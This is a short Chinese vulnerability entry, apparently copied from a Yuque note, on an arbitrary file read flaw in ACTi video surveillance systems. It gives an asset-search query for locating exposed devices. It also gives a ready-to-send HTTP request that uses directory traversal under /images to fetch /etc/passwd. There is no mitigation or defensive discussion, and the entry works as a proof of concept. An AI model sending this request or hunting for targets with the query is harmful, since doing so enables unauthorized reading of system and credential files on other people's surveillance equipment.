# ACTI-视频监控images存在任意文件读取漏洞

### 一、漏洞描述
ACTI-视频监控images存在任意文件读取漏洞

### 二、影响版本
<font style="color:#000000;">ACTI</font>

### 三、资产测绘
```plain
app="ACTi-视频监控"
```

![1721626995048-5ecae669-a849-438f-831b-f8864a7825d4.png](./img/dVTu3UYBLPA-tSD6/1721626995048-5ecae669-a849-438f-831b-f8864a7825d4-107268.png)

### 四、漏洞复现
```plain
GET /images/../../../../../../../../etc/passwd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

![1721627029211-a5ec56ec-b9be-4969-a11a-e9788b489d8f.png](./img/dVTu3UYBLPA-tSD6/1721627029211-a5ec56ec-b9be-4969-a11a-e9788b489d8f-998871.png)



> 更新: 2024-08-12 17:48:53  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mh7ce3oc3gcp5th4>